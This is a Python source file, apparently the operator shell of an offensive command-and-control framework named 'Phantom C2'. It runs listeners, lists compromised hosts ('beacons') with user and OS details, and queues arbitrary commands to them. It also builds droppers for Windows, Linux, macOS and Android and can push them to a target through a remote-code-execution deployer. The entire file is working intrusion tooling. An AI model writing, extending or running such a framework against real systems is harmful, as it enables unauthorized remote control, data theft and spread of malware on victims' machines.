import cmd
import sys
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from datetime import datetime

from phantom.core.c2_server import server_instance, c2_state
from phantom.utils.notifier import notifier

console = Console()

def build_c2_banner():
    return r"""
[bold magenta]
  ██████╗██████╗     ██████╗ ██████╗ ██████╗ ███████╗
 ██╔════╝╚════██╗   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 ██║      █████╔╝   ██║     ██║   ██║██████╔╝█████╗  
 ██║     ██╔═══╝    ██║     ██║   ██║██╔══██╗██╔══╝  
 ╚██████╗███████╗██╗╚██████╗╚██████╔╝██║  ██║███████╗
  ╚═════╝╚══════╝╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
[/bold magenta]
  [dim]──────────────────────────────────────────────────────────[/dim]
  [bold magenta]Phantom C2 Operations Center[/bold magenta]  [dim]v1.0.0[/dim]
  [dim]Secure Encrypted Asynchronous Communications[/dim]
"""

class C2Shell(cmd.Cmd):
    intro = ""
    prompt = "\033[1;35mC2\033[0m > "

    def __init__(self):
        super().__init__()
        self.active_beacon = None

    def preloop(self):
        console.print(build_c2_banner())
        notifier.status("C2 Shell initialized. Type 'help' for commands.")

    def postcmd(self, stop, line):
        if self.active_beacon:
            self.prompt = f"\033[1;35mC2\033[0m (\033[36m{self.active_beacon}\033[0m) > "
        else:
            self.prompt = "\033[1;35mC2\033[0m > "
        return stop

    def do_listeners(self, arg):
        """listeners [start <port> [host] | stop] - Manage C2 listener."""
        parts = arg.split()
        if not parts:
            if server_instance.thread and server_instance.thread.is_alive():
                console.print(f"[*] Listener [green]ACTIVE[/green] on {server_instance.host}:{server_instance.port}")
            else:
                console.print("[*] Listener [red]INACTIVE[/red]")
            return

        action = parts[0]
        if action == "start":
            port = int(parts[1]) if len(parts) > 1 else (session.lport or 443)
            host = parts[2] if len(parts) > 2 else (session.lhost or "0.0.0.0")
            server_instance.start(host=host, port=port)
            notifier.success(f"Started listener on {host}:{port}")
        elif action == "stop":
            server_instance.stop()
            notifier.success("Stopped listener")
        else:
            notifier.error("Usage: listeners start [port] [host] | listeners stop")

    def do_beacons(self, arg):
        """beacons - list active beacons"""
        beacons = c2_state.get_beacons()
        if not beacons:
            notifier.warn("No active beacons.")
            return

        table = Table(title="Active Beacons", border_style="magenta")
        table.add_column("ID", style="cyan")
        table.add_column("Source IP", style="green")
        table.add_column("Local IPs", style="dim green")
        table.add_column("User@Host", style="magenta")
        table.add_column("OS", style="blue")
        table.add_column("Last Seen", style="yellow")
        
        for bid, info in beacons.items():
            user = info.get("user", "")
            host = info.get("hostname", "")
            user_host = f"{user}@{host}" if user or host else "Unknown"
            
            os_arch = info.get("os", "Unknown")
            if "arch" in info:
                os_arch += f" ({info['arch']})"
                
            local_ips = info.get("local_ips", "")
            if len(local_ips) > 20: local_ips = local_ips[:17] + "..."
            
            table.add_row(
                bid, 
                info.get("ip", "Unknown"), 
                local_ips,
                user_host,
                os_arch,
                info.get("last_seen", "Never")
            )
            
        console.print(table)

    def do_interact(self, arg):
        """interact <beacon_id> - drop into beacon interaction mode"""
        bid = arg.strip()
        beacons = c2_state.get_beacons()
        if not bid or bid not in beacons:
            notifier.error("Invalid or missing Beacon ID.")
            return
        
        self.active_beacon = bid
        notifier.success(f"Interacting with beacon {bid}")

    def do_back(self, arg):
        """back - return to main C2 shell from interaction mode"""
        if self.active_beacon:
            self.active_beacon = None
            notifier.success("Returned to global C2 context.")
        else:
            notifier.warn("Already in global context.")

    def default(self, line):
        """Execute a command on the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        # Queue the task
        task_id = c2_state.queue_task(self.active_beacon, line)
        notifier.info(f"Task queued. ID: {task_id}")

    def do_results(self, arg):
        """results - show results for the active beacon"""
        if not self.active_beacon:
            notifier.error("No active beacon. Use 'interact <beacon_id>' first.")
            return

        results = c2_state.get_results(self.active_beacon)
        if not results:
            notifier.warn("No results available for this beacon.")
            return

        for res in results:
            console.print(f"\n[bold cyan]--- Result for Task: {res['task_id']} ---[/]")
            console.print(res["output"])

    def do_generate(self, arg):
        """generate [windows|linux|macos|android] - Generate beacon and dropper for a target platform"""
        import os, subprocess, shutil
        from phantom.utils.network import get_lhost
        from phantom.core.session import session
        
        # Try to guess platform if not provided
        platform = arg.strip().lower()
        if not platform:
            # Check scan results for OS clues
            scan_res = session.get_result("scan") or {}
            all_text = str(scan_res).lower()
            if "linux" in all_text or "unix" in all_text:
                platform = "linux"
                notifier.info("Detected Linux target from scan results. Defaulting to 'linux'.")
            elif "windows" in all_text:
                platform = "windows"
                notifier.info("Detected Windows target from scan results. Defaulting to 'windows'.")
            else:
                # No clear detection — ask the user interactively (arrow keys) if possible
                import sys
                valid_platforms_local = ["windows", "linux", "macos", "android"]
                if sys.stdin.isatty():
                    try:
                        from phantom.utils.interactive import select_option
                        choice = select_option("No platform detected. Select platform:", valid_platforms_local, default_index=0)
                    except Exception:
                        choice = None

                    if choice:
                        platform = choice
                    else:
                        notifier.warn("No platform selected; aborting generation.")
                        return
                else:
                    notifier.warn("No platform detected and non-interactive session. Defaulting to 'windows'.")
                    platform = "windows"
        
        valid_platforms = ["windows", "linux", "macos", "android"]
        if platform not in valid_platforms:
            notifier.error(f"Invalid platform. Choose from: {', '.join(valid_platforms)}")
            return
        
        from phantom.utils.builder import compile_beacon, generate_dropper
        from phantom.utils.payload_manager import add_custom_beacon

        import phantom
        pkg_root = os.path.dirname(phantom.__file__)
        host = get_lhost()
        port = server_instance.port if (server_instance.thread and server_instance.thread.is_alive()) else 443

        # Compile and generate dropper
        beacon_path = compile_beacon(platform, pkg_root)
        if not beacon_path:
            return

        dropper = generate_dropper(platform, host, port)
        if not dropper:
            notifier.error(f"Failed to generate dropper for {platform}")
            return

        # Display and Register
        title_map = {
            "windows": "PowerShell Dropper (Windows)",
            "linux": "Bash Dropper (Linux)",
            "macos": "Bash Dropper (macOS)",
            "android": "ADB Dropper (Android)"
        }
        style_map = {
            "windows": "green",
            "linux": "cyan",
            "macos": "yellow",
            "android": "red"
        }

        console.print(Panel(dropper, title=f"[bold {style_map.get(platform, 'white')}]{title_map.get(platform, 'Dropper')}[/]", border_style=style_map.get(platform, "white")))
        add_custom_beacon(platform, dropper, "Custom C++ Beacon", source="c2_shell")

        # Ask for automatic deployment
        if session.target:
            console.print()
            deploy_choice = input(f"[?] Deploy to {session.target} now? [y/N]: ").strip().lower()
            
            if deploy_choice == 'y':
                from phantom.utils.rce_deployer import deploy_beacon
                console.print("\n[*] Initiating intelligent RCE deployment...")
                success = deploy_beacon(session.target, dropper)
                
                if success:
                    notifier.success(f"Beacon deployed to {session.target}. Check beacons list.")
                    # Give time for beacon to callback
                    import time
                    time.sleep(2)
                else:
                    notifier.warn("Deployment via RCE failed. Copy command manually or try another method.")
            else:
                notifier.info("Beacon command ready. Run it manually on the target.")
        else:
            notifier.info("No target set. Run the command manually or set target first with 'set target <ip>'")

    def do_exit(self, arg):
        """exit - Close C2 and return to main Phantom CLI (or exit completely)"""
        console.print("[dim]Stopping listener...[/]")
        server_instance.stop()
        return True

    def do_quit(self, arg):
        return self.do_exit(arg)

def run_c2():
    try:
        shell = C2Shell()
        shell.cmdloop()
    except KeyboardInterrupt:
        print()
        server_instance.stop()
